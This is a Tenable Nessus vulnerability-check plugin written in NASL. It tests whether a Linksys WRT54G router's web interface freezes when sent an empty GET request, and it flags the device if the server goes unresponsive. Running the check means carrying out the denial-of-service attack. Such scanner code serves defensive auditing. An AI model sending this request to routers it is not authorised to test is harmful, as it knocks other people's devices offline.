#
# (C) Tenable Network Security, Inc.
#
# References:
# http://www.nessus.org/u?6629f502
#
# I wonder if this script is useful: the router is probably already dead.
#

include("compat.inc");

if (description)
{
 script_id(11941);
 script_version("$Revision: 1.18 $");
 script_cvs_date("$Date: 2013/05/03 17:24:50 $");

 script_osvdb_id(51489);

 script_name(english:"Linksys WRT54G Empty GET Request Remote DoS");
 script_summary(english:"Empty GET request freezes Linksys WRT54G HTTP interface");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service
vulnerability.");
 script_set_attribute(attribute:"description", value:
"It is possible to freeze the remote web server by sending an empty GET
request.  This is known to affect Linksys WRT54G routers.");
  # http://web.archive.org/web/20050117183452/http://www.zone-h.org/en/advisories/read/id=3523/
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6629f502");
 script_set_attribute(attribute:"solution", value:"Contact the vendor and, if applicable, upgrade the router's firmware.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_set_attribute(attribute:"plugin_publication_date", value:"2003/12/04");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/h:cisco:linksys_wrt54gc_router");
 script_end_attributes();

 script_category(ACT_DENIAL);

 script_copyright(english:"This script is Copyright (C) 2003-2013 Tenable Network Security, Inc.");
 script_family(english:"CISCO");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 1);

if (http_is_dead(port: port)) exit(0, "The web server listening on port "+port+" is not responding.");

w = http_send_recv_buf(port: port, data: 'GET\r\n');

sleep(2);

if (http_is_dead(port: port, retry: 3)) security_warning(port);
else exit(0, "The web server listening on port "+port+" is not affected.");
